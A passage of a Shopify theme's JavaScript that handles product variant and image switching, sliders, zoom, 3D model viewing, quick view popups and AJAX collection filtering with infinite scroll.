    var tabs = this.tabs = '#ProductSection-' + sectionId + ' .tablink';
    
    $(tabs).on('click', function(e){
      e.preventDefault();
        $(this).parent().addClass("active");
        $(this).parent().siblings().removeClass("active");
        var tab = $(this).attr("href");
        $(".tab-content").not(tab).css("display", "none");
        $(tab).fadeIn();
      	if($(window).width()<767) {
          var tabposition = $(this).offset();
          $("html, body").animate({ scrollTop: tabposition.top }, 500);
        }
    });

    $('.product-tabs li:first-child').addClass("active");
    $('.tab-container h3:first-child').addClass("active");
	$('.tab-container h3:first-child + .tab-content').show();
    
    $(".reviewLink, .moredetail a").on('click', function(e){
      e.preventDefault();
      	var tab = $(this).attr("href");
        $(".product-tabs li").removeClass("active");
      	$(".tablink[href='"+tab+"']").parent().addClass("active");
        $(".tab-content").not(tab).css("display", "none");
        $(tab).fadeIn();
      	var tabposition = $(tab).offset();
      	if($(window).width()<767) {
          $("html, body").animate({ scrollTop: tabposition.top-100 }, 700);
        } else{
          $("html, body").animate({ scrollTop: tabposition.top-150 }, 700);
        }
    }); 
    **/
    
    $(".stickyOptions .selectedOpt").on('click', function(){
		$(".stickyOptions ul").slideToggle("fast");
    });
    $(".stickyOptions .vrOpt").on('click', function(e){
		var value = $(this).attr('data-val'),
            number = $(this).attr('data-no'),
            text = $(this).text();
      	$(".selectedOpt").text(text);
      	$(".stickyCart .selectbox").val(value).trigger('change');
      	$(".stickyOptions ul").slideUp("fast");
      	this.productvariants = JSON.parse(document.getElementById('ProductJson-' + sectionId).innerHTML);
      	$(".stickyCart .product-featured-img").attr('src', this.productvariants.variants[number].featured_image.src.replace(/(\.[^\.]*$|$)/, '_60x60' + '$&'));
    });

    // change variant on image sections
    if (typeof variantImages !== 'undefined'){
      $(this.selectors.productThumbImages).bind('click', function(){
        var arrImage = $(this).attr('href').split('?')[0].split('.');
        var strExtention = arrImage.pop();
        var strRemaining = arrImage.pop().replace(/_[a-zA-Z0-9@]+$/,'');
        var strNewImage = arrImage.join('.')+"."+strRemaining+"."+strExtention;
        if (typeof variantImages[strNewImage] !== 'undefined') {
            productOptions.forEach(function (value, i) {
             optionValue = variantImages[strNewImage]['option-'+i];
             if (optionValue !== null && $('.single-option-selector:eq('+i+') option').filter(function() { return $(this).text() === optionValue }).length) {
               $(".swatch-"+i).find('.swatchInput[value="'+optionValue+'"]').prop( "checked", true );
               $('.single-option-selector:eq('+i+')').val(optionValue).trigger('change');
             }
          });
        }
      });
    }
    
    // Stop parsing if we don't have the product json script tag when loading
    // section in the Theme Editor
    if (!$('#ProductJson-' + sectionId).html()) {
      return;
    }

    this.productSingleObject = JSON.parse(document.getElementById('ProductJson-' + sectionId).innerHTML);

    this.settings.zoomEnabled = $(this.selectors.productFeaturedImage).hasClass('js-zoom-enabled');
    this.settings.imageSize = theme.Images.imageSize($(this.selectors.productFeaturedImage).attr('src'));

    this._initBreakpoints();
    this._stringOverrides();
    this._initVariants();
    this._initImageSwitch();
   	this._initThumbnailSlider();
    this._setActiveThumbnail();
    this._initModelViewerLibraries();
    this._initShopifyXrLaunch();
    
    // Pre-loading product images to avoid a lag when a thumbnail is clicked, or
    // when a variant is selected that has a variant image
    theme.Images.preload(this.productSingleObject.images, this.settings.imageSize);
  }

  Product.prototype = _.assignIn({}, Product.prototype, {
    _stringOverrides: function() {
      theme.productStrings = theme.productStrings || {};
      $.extend(theme.strings, theme.productStrings);
    },

    _initBreakpoints: function() {
      var self = this;

      enquire.register(this.settings.mediaQuerySmall, {
        match: function() {
          // destroy image zooming if enabled
          if (self.settings.zoomEnabled) {
            _destroyZoom($(self.selectors.productImageWrap));
          }
          self.settings.bpSmall = true;
        },
        unmatch: function() {
          self.settings.bpSmall = false;
        }
      });

      enquire.register(this.settings.mediaQueryMediumUp, {
        match: function() {
          if (self.settings.zoomEnabled) {
            _enableZoom($(self.selectors.productImageWrap));
          }
        }
      });
    },

    _initVariants: function() {
      var options = {
        $container: this.$container,
        enableHistoryState: this.$container.data('enable-history-state') || false,
        singleOptionSelector: this.selectors.singleOptionSelector,
        originalSelectorId: this.selectors.originalSelectorId,
        product: this.productSingleObject,
        productColorOptions:this.$container.find('.option1'),
      };
      this.variants = new slate.Variants(options);
      //变体添加颜色分组start
      let variantSrcElements = options.productColorOptions.find('div[data-variantimgsrc]')
      let groupIndexList = []
      for (let i = 0; i < this.productSingleObject.images.length; i++){
        for (let j = 0; j < variantSrcElements.length; j++) {
          let sizedImgUrl = theme.Images.getSizedImageUrl(variantSrcElements[j].getAttribute('data-variantimgsrc'),'master')
          if(this.productSingleObject.images[i].indexOf(sizedImgUrl) > -1){
            //把分组下标临界点和对应颜色组成对象数组
            groupIndexList.push({index:i,value:variantSrcElements[j].getAttribute('data-value')})
          }
        }
      }
      let imgEls = this.$container.find('.product-single__photo')
      // 添加一个空颜色的末项item，让遍历和写入属性逻辑更清晰
      groupIndexList.push({index:imgEls.length,value:undefined})
      for (let i = 0 ; i < groupIndexList.length - 1; i++) {
        imgEls.slice(groupIndexList[i].index, groupIndexList[i + 1].index).attr('data-color-group',groupIndexList[i].value)
      }
      //变体添加颜色分组end
      this.$container.on('variantChange' + this.settings.namespace, this._updateAddToCart.bind(this));
      this.$container.on('variantImageChange' + this.settings.namespace, this._updateImages.bind(this));
      this.$container.on('variantPriceChange' + this.settings.namespace, this._updatePrice.bind(this));
      this.$container.on('variantSKUChange' + this.settings.namespace, this._updateSKU.bind(this));
    },

    _initImageSwitch: function() {
      if (!$(this.selectors.productThumbImages).length) {
        return;
      }
      var self = this;
      $(this.selectors.productThumbImages).on('click', function(evt) {
        evt.preventDefault();
        var $el = $(this),
        	imageSrc = $el.attr('href'),
        	zoomSrc = $el.data('zoom');
        self._setActiveThumbnail(imageSrc);
        self._switchImage(imageSrc, zoomSrc);
      });
    },
    
    _switchImage: function(image, zoomImage) {
      if($(".index-section--featured-product").length || $(".custom__item-inner .ptContainer").length ){
        var $image = $(this.selectors.productImageWrap + '[data-zoom="' + zoomImage + '"]').data('slide');
        $(this.selectors.productFeaturedImage).attr('src', image);

        // destroy image zooming if enabled
        if (this.settings.zoomEnabled) {
          _destroyZoom($(this.selectors.productImageWrap));
        }

        if (!this.settings.bpSmall && this.settings.zoomEnabled && zoomImage) {
          $(this.selectors.productImageWrap).data('zoom', zoomImage);
          _enableZoom($(this.selectors.productImageWrap));
        }
      }
    },

    _setActiveThumbnail: function(src) {
      var activeClass = 'active-thumb';

      // If there is no element passed, find it by the current product image
      if (typeof src === 'undefined') {
        src = $(this.selectors.productThumbImages + '.activeSlide').attr('href');
      }

      // Set active thumbnails (incl. slick cloned thumbs) with matching 'href'
      var $thumbnail = $(this.selectors.productThumbImages + '[href="' + src + '"]');
      $(this.selectors.productThumbImages).removeClass(activeClass);
      $thumbnail.addClass(activeClass);
      var slideno = $thumbnail.parent().data('slide');
      this._handleImageFilter()
      if(theme.productStrings.prStyle == "style4" || theme.productStrings.prStyle == "style5" ){
      	var imgposition = $(".product-single__photo[data-slide='"+slideno+"']").offset();
      	if($(window).width()>767) {
          $("html, body").animate({ scrollTop: imgposition.top-70 }, 700);
        } else {
          $('.primgSlider').slick('slickGoTo', slideno);
        }
      } else {
        if($(window).width() > 767) {
          $('.primgSlider').slick('slickGoTo', slideno);
        } else {
          $('.primgSlider').slick('slickGoTo', 0);
        }
      }
    },

    _initThumbnailSlider: function() {
      $(this.selectors.productThumbs).slick();
      $(".primgSlider").slick({
        useCSS: false,
        useTransform: false,
        touchMove: true,
        swipe: false,
        slidesToShow: 1,
        fade: false
      });
      
       if (theme.productStrings.prStyle == "style4" || theme.productStrings.prStyle == "style5"){
         $(".primgSlider").slick('unslick');
         $(window).on('load resize', function(){
           if($(window).width() > 767){
           		$(".primgSlider").slick('unslick');
           } else {
             	$(".primgSlider").slick("refresh");
           }
         });
       }
       
       $(window).on('load', function (e) {
       	$('.product-single__thumbnails-item[data-slide="0"] .prvideo').trigger('click');
         var video = $('.primgSlider .videoSlide.slick-active video').get(0);
        if($(video).length) {
        	video.play();
        }
       });
       
       var zoomItem = this.selectors.productImageWrap,
       		enableZoom = !this.settings.bpSmall && this.settings.zoomEnabled;
       if (enableZoom){_destroyZoom(zoomItem);_enableZoom(zoomItem);}
       $('.primgSlider').on('afterChange', function(event, slick, currentSlide) {
         if (enableZoom){_destroyZoom(zoomItem);_enableZoom(zoomItem);}

         if($('.primgSlider .videoSlide video').length) { $('.primgSlider .videoSlide video').get(0).pause(); }
         var video = $('.primgSlider .videoSlide.slick-active video').get(0);
         if($(video).length){ video.play(); }
         
         if($('.slick-current model-viewer').length){ $('.slick-current .shopify-model-viewer-ui__button--poster').trigger('click')}
       });
      
    },
    
    _initModelViewerLibraries: function() {
      var modelViewerElements = this.container.querySelectorAll(
        this.selectors.productMediaTypeModel
      );
      if (modelViewerElements.length < 1) return;
      theme.ProductModel.init(modelViewerElements, this.settings.sectionId);
    },

    _initShopifyXrLaunch: function() {
      
    },

    _initShopifyXrLaunchHandler: function() {
      var currentMedia = this.container.querySelector(
        this.selectors.productMediaWrapper +
          ':not(.' +
          self.classes.hidden +
          ')'
      );
      currentMedia.dispatchEvent(
        new CustomEvent('xrLaunch', {
          bubbles: true,
          cancelable: true
        })
      );
    },

    _updateAddToCart: function(evt) {
      var variant = evt.variant;

      if (variant){
        $(this.selectors.productPrices).removeClass('visibility-hidden').attr('aria-hidden', 'true');
        
        if (variant.unit_price != undefined) {
          $("[data-unit-price]").html(theme.Currency.formatMoney(variant.unit_price, theme.moneyFormat));
          $("[data-unit-base]").html(variant.unit_price_measurement.reference_value + variant.unit_price_measurement.reference_unit);
          $(".price__unit").removeClass('hide');
        } else {
          $(".price__unit").addClass('hide');
        }

        if (variant.available){
          var quantity = $("#pvr-"+variant.id).text(),
          	  maxquantity = $("#quantity_message").data('qty');
          
          $(this.selectors.addToCart).prop('disabled', false);
          if(quantity < 1 && variant.inventory_management == "shopify"){
          	$(this.selectors.addToCartText).text(theme.strings.preOrder);
          } else {
            $(this.selectors.addToCartText).text(theme.strings.addToCart);
          }
          
          if(quantity < 1 && variant.inventory_management == "shopify"){
            $(".stockLbl").removeClass('instock outstock').addClass('preorder').text($(".stockLbl").data("pre"));
          } else {
            $(".stockLbl").removeClass('preorder outstock').addClass('instock').text($(".stockLbl").data("in"));
          }
          if(quantity < maxquantity && quantity != 0 && variant.inventory_management == "shopify"){
          	$("#quantity_message").show().find(".items").text(quantity);
          } else {
            $("#quantity_message").hide();
          }
        } else {
          // The variant doesn't exist, disable submit button and change the text.
          // This may be an error or notice that a specific variant is not available.
          $(this.selectors.addToCart).prop('disabled', true);
          $(this.selectors.addToCartText).text(theme.strings.soldOut);
          $(".stockLbl").removeClass('preorder instock').addClass('outstock').text($(".stockLbl").data("out"));
          $("#quantity_message").hide();
        }
      } else {
        $(this.selectors.addToCart).prop('disabled', true);
        $(this.selectors.addToCartText).text(theme.strings.unavailable);
        $(this.selectors.productPrices).addClass('visibility-hidden').attr('aria-hidden', 'false');
        $(".stockLbl").removeClass('preorder instock').addClass('outstock').text($(".stockLbl").data("out"));
        $("#quantity_message").hide();
      }
    },

    _updateImages: function(evt) {
      var variant = evt.variant,
      	  sizedImgUrl = theme.Images.getSizedImageUrl(variant.featured_media.preview_image.src, this.settings.imageSize),
      	  zoomSizedImgUrl;
      this._setActiveThumbnail(sizedImgUrl);
      if (this.settings.zoomEnabled) {
        zoomSizedImgUrl = theme.Images.getSizedImageUrl(variant.featured_media.preview_image.src, this.settings.imageZoomSize);
      }
      this._switchImage(sizedImgUrl, zoomSizedImgUrl);
    },

    _updatePrice: function(evt) {
      var variant = evt.variant;

      // Update the product price
      $(this.selectors.originalPrice).html(theme.Currency.formatMoney(variant.price, theme.moneyFormat));

      // Update and show the product's compare price if necessary
      if (variant.compare_at_price > variant.price) {
        $(this.selectors.comparePrice).html(theme.Currency.formatMoney(variant.compare_at_price, theme.moneyFormat)).removeClass('hide');
        $(this.selectors.originalPriceWrapper).addClass(this.selectors.saleClasses);
        $(this.selectors.saleLabel).removeClass('hide');        
        var price1 = variant.compare_at_price-variant.price,
        	price2 = price1 * 100,
        	salecount = price2/variant.compare_at_price;        
        $(this.selectors.discountBadge).find('.off').find('span').text(+salecount.toFixed());        
        $(this.selectors.discountBadge).removeClass('hide');
        $(this.selectors.saveAmount).html(theme.Currency.formatMoney(price1,  theme.moneyFormat));        

      } else {
        $(this.selectors.comparePrice).addClass('hide');
        $(this.selectors.saleLabel).addClass('hide');
        $(this.selectors.discountBadge).addClass('hide');
        $(this.selectors.originalPriceWrapper).removeClass(this.selectors.saleClasses);
      }
    },

    _updateSKU: function(evt) {
      var variant = evt.variant;
      $(this.selectors.SKU).html(variant.sku);
    },

    _handleImageFilter:function () {
      if($(window).width() <= 767) {
        $('.primgSlider').slick('slickUnfilter');
        let colorOptionsName = this.$container.find('.option1 input:checked').parent().attr('data-value')
        $('.primgSlider').slick('slickFilter',`div[data-color-group=${colorOptionsName}]`);
      }
    },
    onUnload: function() {
      this.$container.off(this.settings.namespace);
    }
  });

  function _enableZoom($el) {
    $($el).each(function(){
    	var zoomUrl = $(this).data('zoom');
    	$(this).zoom({
      		url: zoomUrl
    	});
     });
  }

  function _destroyZoom($el) {
    $($el).each(function(){
    	$(this).trigger('zoom.destroy');
     });
  }
  return Product;
})();

theme.ProductModel = (function() {
  var modelJsonSections = {};
  var models = {};
  var xrButtons = {};

  var selectors = {
    mediaGroup: '[data-product-single-media-group]',
    xrButton: '[data-shopify-xr]'
  };

  function init(modelViewerContainers, sectionId) {
    modelJsonSections[sectionId] = {
      loaded: false
    };

    modelViewerContainers.forEach(function(modelViewerContainer, index) {
      var mediaId = modelViewerContainer.getAttribute('data-media-id');
      var modelViewerElement = modelViewerContainer.querySelector(
        'model-viewer'
      );
      var modelId = modelViewerElement.getAttribute('data-model-id');

      if (index === 0) {
        var mediaGroup = modelViewerContainer.closest(selectors.mediaGroup);
        var xrButton = mediaGroup.querySelector(selectors.xrButton);
        xrButtons[sectionId] = {
          element: xrButton,
          defaultId: modelId
        };
      }

      models[mediaId] = {
        modelId: modelId,
        sectionId: sectionId,
        container: modelViewerContainer,
        element: modelViewerElement
      };
    });

    window.Shopify.loadFeatures([
      {
        name: 'shopify-xr',
        version: '1.0',
        onLoad: setupShopifyXr
      },
      {
        name: 'model-viewer-ui',
        version: '1.0',
        onLoad: setupModelViewerUi
      }
    ]);
    theme.LibraryLoader.load('modelViewerUiStyles');
  }

  function setupShopifyXr(errors) {
    if (errors) return;

    if (!window.ShopifyXR) {
      document.addEventListener('shopify_xr_initialized', function() {
        setupShopifyXr();
      });
      return;
    }

    for (var sectionId in modelJsonSections) {
      if (modelJsonSections.hasOwnProperty(sectionId)) {
        var modelSection = modelJsonSections[sectionId];

        if (modelSection.loaded) continue;
        var modelJson = document.querySelector('#ModelJson-' + sectionId);

        window.ShopifyXR.addModels(JSON.parse(modelJson.innerHTML));
        modelSection.loaded = true;
      }
    }
    window.ShopifyXR.setupXRElements();
  }

  function setupModelViewerUi(errors) {
    if (errors) return;

    for (var key in models) {
      if (models.hasOwnProperty(key)) {
        var model = models[key];
        if (!model.modelViewerUi) {
          model.modelViewerUi = new Shopify.ModelViewerUI(model.element);
        }
      }
    }
  }

  function removeSectionModels(sectionId) {
    for (var key in models) {
      if (models.hasOwnProperty(key)) {
        var model = models[key];
        if (model.sectionId === sectionId) {
          models[key].modelViewerUi.destroy();
          delete models[key];
        }
      }
    }
    delete modelJsonSections[sectionId];
  }

  return {
    init: init,
    removeSectionModels: removeSectionModels
  };
})();

theme.LibraryLoader = (function() {
  var types = {
    link: 'link',
    script: 'script'
  };

  var status = {
    requested: 'requested',
    loaded: 'loaded'
  };

  var cloudCdn = 'https://cdn.shopify.com/shopifycloud/';

  var libraries = {
    modelViewerUiStyles: {
      tagId: 'shopify-model-viewer-ui-styles',
      src: cloudCdn + 'model-viewer-ui/assets/v1.0/model-viewer-ui.css',
      type: types.link
    }
  };

  function load(libraryName, callback) {
    var library = libraries[libraryName];

    if (!library) return;
    if (library.status === status.requested) return;

    callback = callback || function() {};
    if (library.status === status.loaded) {
      callback();
      return;
    }

    library.status = status.requested;

    var tag;

    switch (library.type) {
      case types.script:
        tag = createScriptTag(library, callback);
        break;
      case types.link:
        tag = createLinkTag(library, callback);
        break;
    }

    tag.id = library.tagId;
    library.element = tag;

    var firstScriptTag = document.getElementsByTagName(library.type)[0];
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
  }

  function createScriptTag(library, callback) {
    var tag = document.createElement('script');
    tag.src = library.src;
    tag.addEventListener('load', function() {
      library.status = status.loaded;
      callback();
    });
    return tag;
  }

  function createLinkTag(library, callback) {
    var tag = document.createElement('link');
    tag.href = library.src;
    tag.rel = 'stylesheet';
    tag.type = 'text/css';
    tag.addEventListener('load', function() {
      library.status = status.loaded;
      callback();
    });
    return tag;
  }

  return {
    load: load
  };
})();


// Product quick view
theme.QuickView = (function() {
  $('body').on( 'click', '.quick-view', function(e){
    $.ajax({
      beforeSend : function (){
        $('body').addClass("loading");
        $('html').css({'overflow':'hidden','height':$(window).height()})
      },
      url: $(this).attr('href'),
      success: function(data) {
        $.magnificPopup.open({
          items: {
            src: '<div class="quick-view-popup mfpbox mfp-with-anim" id="content_quickview">' + data + '</div>',
            type: 'inline'
          },
          removalDelay:500,
          callbacks: {
            beforeOpen: function(){
              $('.stickyHeader').addClass('popup');
              this.st.mainClass = 'mfp-zoom-in';
            },
            open: function() {
              $('.mfp-wrap').css({'overflow':'hidden auto','position':'fixed','top':0})
              $.getScript(window.location.protocol + "//productreviews.shopifycdn.com/assets/v4/spr.js");
            },
            close: function() {
              $('html').css({'overflow':'auto','height':'auto'})
              $('.stickyHeader').removeClass('popup');
              $( '#content_quickview' ).empty();
            }
          },
        });
      },
      complete: function() {
        $('body').removeClass("loading");
      }
    })
    e.preventDefault();
    e.stopPropagation();
  });
})();

theme.Quotes = (function() {
  var config = {
    mediaQuerySmall: 'screen and (max-width: 749px)',
    mediaQueryMediumUp: 'screen and (min-width: 750px)',
    slideCount: 0
  };
  var defaults = {
    accessibility: true,
    arrows: true,
    dots: false,
    autoplay: false,
    touchThreshold: 20,
    rtl: theme.rtl,
    slidesToShow: 1,
    slidesToScroll: 1,
    adaptiveHeight: true
  };

  function Quotes(container) {
    var $container = this.$container = $(container);
    var sectionId = $container.attr('data-section-id');
    var wrapper = this.wrapper = '.quotes-wrapper';
    var slider = this.slider = '#Quotes-' + sectionId;
    var $slider = $(slider, wrapper);
    var sliderActive = false;

    config.slideCount = $slider.data('count');

    // Override slidesToShow/Scroll if there are not enough blocks
    if (config.slideCount < defaults.slidesToShow) {
      defaults.slidesToShow = config.slideCount;
      defaults.slidesToScroll = config.slideCount;
    }

    $slider.on('init', this.a11y.bind(this));
    initSlider($slider, defaults);

    function initSlider(sliderObj, args) {
      if (sliderActive) {
        sliderObj.slick('unslick');
        sliderActive = false;
      }

      sliderObj.slick(args);
      sliderActive = true;
    }
  }

  Quotes.prototype = _.assignIn({}, Quotes.prototype, {
    onUnload: function() {
      enquire.unregister(config.mediaQuerySmall);
      enquire.unregister(config.mediaQueryMediumUp);

      $(this.slider, this.wrapper).slick('unslick');
    },

    onBlockSelect: function(evt) {
      // Ignore the cloned version
      var $slide = $('.quotes-slide--' + evt.detail.blockId + ':not(.slick-cloned)');
      var slideIndex = $slide.data('slick-index');
      $(this.slider, this.wrapper).slick('slickGoTo', slideIndex);
    },

    a11y: function(event, obj) {
      var $list = obj.$list;
      var $wrapper = $(this.wrapper, this.$container);

      $list.removeAttr('aria-live');
      $wrapper.on('focusin', function(evt) {
        if ($wrapper.has(evt.target).length) {
          $list.attr('aria-live', 'polite');
        }
      });

      // Remove aria-live
      $wrapper.on('focusout', function(evt) {
        if ($wrapper.has(evt.target).length) {
          $list.removeAttr('aria-live');
        }
      });
    }
  });
  return Quotes;
})();

theme.slideshows = {};

theme.SlideshowSection = (function() {
  function SlideshowSection(container) {
    var $container = this.$container = $(container);
    var sectionId = $container.attr('data-section-id');
    var slideshow = this.slideshow = '#Slideshow-' + sectionId;

    $(slideshow).each(function() {
      var $el = $(this);    
    });

    theme.slideshows[slideshow] = new theme.Slideshow(slideshow);
  }

  return SlideshowSection;
})();

theme.SlideshowSection.prototype = _.assignIn({}, theme.SlideshowSection.prototype, {
  onUnload: function() {
    delete theme.slideshows[this.slideshow];
  },

  onBlockSelect: function(evt) {
    var $slideshow = $(this.slideshow);

    // Ignore the cloned version
    var $slide = $('.slideshow__slide--' + evt.detail.blockId + ':not(.slick-cloned)');
    var slideIndex = $slide.data('slick-index');

    // Go to selected slide, pause autoplay
    $slideshow.slick('slickGoTo', slideIndex).slick('slickPause');
  },

  onBlockDeselect: function() {
    // Resume autoplay
    $(this.slideshow).slick('slickPlay');
  }
});

// CATEGORY SLIDER
theme.collectionView = (function() {
  function collectionView(container) {
    var $container = this.$container = $(container);
    var sectionId = $container.attr('data-section-id'),
    	sliderSecond = $container.attr('data-section-timeout');
    $('#SortBySt-text').text($('#SortBySt').find("option:selected").text())
    $(document).on('change','#SortBySt',function(e){
		var value = $(this).val();
      	var selected = $('#SortBySt').find("option:selected").text()
        $('#SortBySt-text').text(selected)
      	if ($("#CollectionFiltersForm").length){
			$("#SortBy").val(value).trigger('change');
        } else {
          if (value.length) {
            window.location.search = 'sort_by='+value;
          } else {
            window.location.href = window.location.href.replace(window.location.search, '');
          }
        }
	});
    
	$(document).on('click', '.change-view', function(e){
      var view = $(this).data('view'),
          url = document.URL.split('?'),
          viewtp = location.search.split('view=');
	  if (viewtp[0] == '?'){
		window.location = url[0]+'?view=' + view;
	  } else if(viewtp[1] == 'list' || viewtp[1] == 'grid'){
        window.location = url[0]+viewtp[0]+'view=' + view;
      } else {
        window.location = url + '?view=' + view;
      }
    });
    /**$(document).on('change', '.optTag', function(e){
      var URL =  $('.sidebar_tags').data('url'),
          paramString = window.location.search.substring(1);
      	
      	var productFilters = $('input.optTag'),
            newTags = [],
            url = '';

        productFilters.each(function() {
            if ($(this).val() && $(this).is(":checked") == true) {
              newTags.push($(this).val());                        
            }
        });
        if(newTags.length){
        	var tags = newTags.join('+');
       		ajaxfilter(URL+'/'+tags+'?'+paramString);
        } else {
          	ajaxfilter(URL+'?'+paramString);
        }
	});
    **/
    /**$(document).on('change', '.flForm .custCheck, .prRange, #SortBy', function(e){
      var URL =  '//'+window.location.hostname+window.location.pathname,
      	formdata = $('#CollectionFiltersForm').serialize();
      //window.location.replace(URL+'?'+formdata);
      ajaxfilter(URL+'?'+formdata);
	});**/
  	/**$(document).on('click', '.actFilter', function(e){
      e.preventDefault();
      var URL =  '//'+window.location.hostname+$(this).attr('href');
      ajaxfilter(URL);
	});**/
  
  	ajaxfilter = (function(url,isCache){
        var xhr = $.ajax({
          type: 'GET',
          url: url,
          data:{},
          beforeSend:function(){
            if(!isCache){
            	$('body').addClass('loading hideOverly');
            }
          },
          complete: function(data){
            var getPathName = function(str){
              if (str.indexOf("?") != -1) {   
                return str.split("?")[0];  
              }
              return str;
            }
            console.log("isCache=",isCache);
            /**console.log('返回filter=',getPathName(url),location.pathname);**/
            if(getPathName(url)!== location.pathname && isCache){
              	console.log('change filter ,not render old url request')
            	return;
            }
            var resDom = $(".productList .grid-products", data.responseText);
            var resNumber = resDom.find(".grid__item").length; 
            console.log('ajaxfilter response=',url,resNumber);
            $('.filters-toolbar__product-count').html($(".filters-toolbar__product-count", data.responseText).html());
            $('.filters-toolbar__product-count').attr("total",$(".filters-toolbar__product-count", data.responseText).attr("total"));
            if(!isCache){
              $('.productList .grid-products').html(resDom.html());
              
              $('#CollectionFiltersForm').html($("#CollectionFiltersForm", data.responseText).html());
              $('.active-facets').html($(".active-facets", data.responseText).html());

              $('.pagination').html($(".pagination", data.responseText).html());
              refreshPageMoreLoad();
              if(!$(".pagination", data.responseText).html()){
                $('.pagination').hide();
              } else {
                $('.pagination').show();
              }
              $('.infinitpaginOuter').html($(".infinitpaginOuter", data.responseText).html());
              if(!$(".infinitpaginOuter", data.responseText).html()){
                $('.infinitpagin').remove();
              }
              if(theme.mlcurrency){ currenciesChange("sapn.money"); }
              $('body').removeClass('loading hideOverly');
              loadMoreBtn();

              if($(".spr-badge").length > 0) {
                  $.getScript(window.location.protocol + "//productreviews.shopifycdn.com/assets/v4/spr.js");
              }
              productGridView(sectionId);
              setTimeout(function(){ productGridView(sectionId); },100);

              if($('.prRange').length){ priceSlider(); }

              history.pushState({page: url}, url, url);
              
              var resInfinitpagin = $(".infinitpagin", data.responseText);
              var pagesize = $('.infinitpagin a').attr('pagesize');
              var $productList = $('.productList');
              if(resInfinitpagin.length>0){
                var needLoadNumber  = $productList.attr("needLoadNumber");
                var newNeedLoadNumber = needLoadNumber - resNumber;
                if(newNeedLoadNumber > 0){
                  $productList.attr("needLoadNumber",newNeedLoadNumber);
                  /** load date number less than need prepare load number ,load next page **/
                  ajaxfilter($('.infinitpagin a').attr('href'));
                }else{
                  var nextCacheUrl = resInfinitpagin.find("a").attr('href');
                  $productList.attr("needCacheNumber",pagesize?pagesize*1:16*1);
                  ajaxfilter(nextCacheUrl,true);
                }
              }
            }else{
              var resInfinitpagin = $(".infinitpagin", data.responseText);
              if(resInfinitpagin.length>0){
                resDom.children().addClass("cache-hide");
                $('.productList .grid-products').append(resDom.html());
                
                var $productList = $('.productList');
                var needCacheNumber  = $productList.attr("needCacheNumber");
                var nextCacheUrl = resInfinitpagin.find("a").attr('href');
                $('.infinitpagin a').attr("nextCacheUrl",nextCacheUrl);
                if(needCacheNumber){
                  var newNeedCacheLoadNumber = needCacheNumber - resNumber;
                  if(newNeedCacheLoadNumber > 0){
                    $productList.attr("needCacheNumber",newNeedCacheLoadNumber);
                    ajaxfilter(nextCacheUrl,true);
                  }
                }
              }else{
              	$('.productList .grid-products').append(resDom.html());
                $('.infinitpagin').remove();
              }
            }
          }
        });
      if(!window.collectionXhr){
      	window["collectionXhr"]  = xhr;
      }else{
      	window.collectionXhr = xhr
      }
    });
    
    
    
	/*$(window).on('load delayed-resize', function (e, resizeEvent) {
  		productGridView(sectionId);
    });*/
    
    infiniteScroll = function(){
      	var action = 'scroll load delayed-resize';
        $(window).on(action, function(){
          var moreURL = $('.infinitpagin a').attr('href');
          /** manager want show loadMoreBtn ,also infiniteScroll **/
          if($('.infinitpagin a.infinite').length){
            var bottom = $('.infinitpagin').offset();
            var docTop = ($(document).scrollTop() + $(window).height() - 50);
            if( docTop + 392*3 > bottom.top){ /** between with bottom three item height to load next page  392 is mobile height**/
              $(window).off(action);
              var pagesize = $('.infinitpagin a').attr('pagesize');
              var needLoadNumber = pagesize?pagesize*1:16*1; /** once get two page **/
              $('.productList').attr("needLoadNumber",needLoadNumber);
              loadMore(moreURL);
            }
          }
        });
    }
    loadMoreBtn = function() {
		$('.infinitpagin a.loadMore').click(function(e){
          e.preventDefault();
          	/**var moreURL = $(this).attr('href');
			loadMore(moreURL);**/
          var $a = $(this);
          var pagesize = $('.infinitpagin a').attr('pagesize');
          var needCacheNumber = pagesize?pagesize*1:16*1;
          $('.productList').attr("needCacheNumber",needCacheNumber);
          if($a.attr('nextCacheUrl') && $a.attr('href')!== $a.attr('nextCacheUrl')){
          	$('.productList .grid-products .cache-hide').removeClass("cache-hide");
            var url = new URL(location.origin+$a.attr('nextCacheUrl'));
            var nextCachePage =  url.searchParams.get('page');
            var currentCachePage = nextCachePage-1>0?nextCachePage-1:nextCachePage;
            url.searchParams.set('page', currentCachePage);
            var currentCacheUrl = location.pathname +'?'+url.searchParams.toString();
            $a.attr('href',currentCacheUrl);
            refreshPageMoreLoad(currentCachePage);
            loadMore($a.attr('nextCacheUrl'),true);
          }else{
            $('.productList .grid-products .cache-hide').removeClass("cache-hide");
          	loadMore($a.attr('href'));
          }
        });
    }
    refreshPageMoreLoad = function(fPage){
      var $a = $('.infinitpagin a');
      var href = $a.attr('href');
      var total = $(".filters-toolbar__product-count").attr('total');
      if($(".page-more-load").length && $a.length){
        var page = 1
        if(fPage){
        	page = fPage
        }else{
          var url = new URL(location.origin+href);
          page =  url.searchParams.get('page');
        }
        var pageSize = $a.attr('pagesize');
        var currentTotal = page*pageSize;
        
      	$(".page-more-load").text("Currently Displaying 1 - "+currentTotal+" of "+total+" Styles");
      }else{
        var pageSize = $(".productList").attr('pagesize');
      	$(".page-more-load").text("Currently Displaying 1 - "+pageSize+" of "+total+" Styles");
      }
    }
    loadMore = function(moreURL,isCache) {
      var $page = $('.infinitpagin a')
      var prehref = $page.attr('prehref');
      if(moreURL===prehref){
        // console.log('repeat load page url is cancel',prehref);
      	return;
      }
      var total = $page.attr('total');
      var pagesize = $page.attr('pagesize');
      var currentPage = $page.attr('currentPage');
      var totalPage = Math.ceil(total/pagesize);
      var preLoadPage = Number(currentPage)+1
      if(preLoadPage>totalPage){
      	 // console.log('load page is the last page');
         $('.productList .grid-products .cache-hide').removeClass("cache-hide");
         $('.productList').removeAttr("needLoadNumber");
         return;
      }
      /**console.log('isCache=',isCache);**/
      if (moreURL.length){
      $.ajax({
          type: 'GET',
          dataType: 'html',
          url: moreURL,
          beforeSend:function(){
            $('.infinitpagin a').attr('prehref',moreURL); /** record the load page url **/
            if(!isCache){
              if ($('.infinitpaginOuter').attr('data-type') == "button" ){
                  $('body').addClass('loading hideOverly');
              } else {
                $('.infinitpagin a').show();
              }
            }
          },
          complete: function (data) {
            $('.infinitpagin a').attr('prehref',''); /** clear previous the load page url **/
            var resDom = $(".productList .grid-products", data.responseText);
            var resNumber = resDom.find(".grid__item").length; 
            if(!isCache){
              if($('.productList .grid-products').length){
                  $('.productList .grid-products').append(resDom.html());
              } else {
                  $('.productList .list-view-items').append(resDom.html());
              }
